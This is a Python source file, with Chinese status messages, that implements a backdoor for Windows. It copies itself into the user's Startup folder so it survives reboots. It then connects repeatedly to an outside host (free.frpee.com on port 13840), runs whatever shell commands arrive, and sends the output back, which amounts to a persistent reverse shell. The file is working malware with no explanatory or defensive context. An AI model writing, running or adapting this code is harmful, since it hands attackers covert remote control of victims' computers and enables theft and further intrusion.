import socket
import os
import threading
import time
import sys
import shutil

server_host = "free.frpee.com"
server_port = 13840
current_dir = os.getcwd()
script_path = os.path.abspath(sys.argv[0])

def startup_main(exe_path):
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    if not os.path.exists(startup_folder):
        os.makedirs(startup_folder)
    exe_name = os.path.basename(exe_path)
    destination_path = os.path.join(startup_folder, exe_name)
    shutil.copy(exe_path, destination_path)
    print(f"文件已复制到启动文件夹: {destination_path}")

def receive_commands(server_socket):
    global current_dir
    while True:
        try:
            command = server_socket.recv(4096).decode('utf-8')
            if not command:
                break
            if command.strip().lower() == 'pwd':
                server_socket.send(current_dir.encode('utf-8'))
                continue
            if command.lower().startswith('cd '):
                try:
                    if '/d' in command.lower():
                        new_dir = command[command.lower().index('/d')+3:].strip()
                    else:
                        new_dir = command[3:].strip()
                    os.chdir(new_dir)
                    current_dir = os.getcwd()
                    output = f"目录已更改为: {current_dir}"
                except Exception as e:
                    output = f"更改目录失败: {str(e)}"
                server_socket.send(output.encode('utf-8'))
                continue
            output = os.popen(command).read()
            server_socket.send(output.encode('utf-8'))
        except Exception as e:
            print(f"与服务器通信时出错: {e}")
            break

def connect_to_server():
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client.connect((server_host, server_port))
            print(f"[*] 已连接到服务器 {server_host}:{server_port}")
            
            receive_thread = threading.Thread(
                target=receive_commands,
                args=(client,)
            )
            receive_thread.daemon = True
            receive_thread.start()
            receive_thread.join()
            
        except Exception as e:
            print(f"连接服务器失败: {e}\n正在尝试重新连接服务器...\n")
            time.sleep(0.5)
            
        finally:
            try:
                client.close()
            except:
                pass
            print("[*] 与服务器的连接已关闭")

if __name__ == "__main__":
    print(script_path)
    startup_main(script_path)
    connect_to_server()
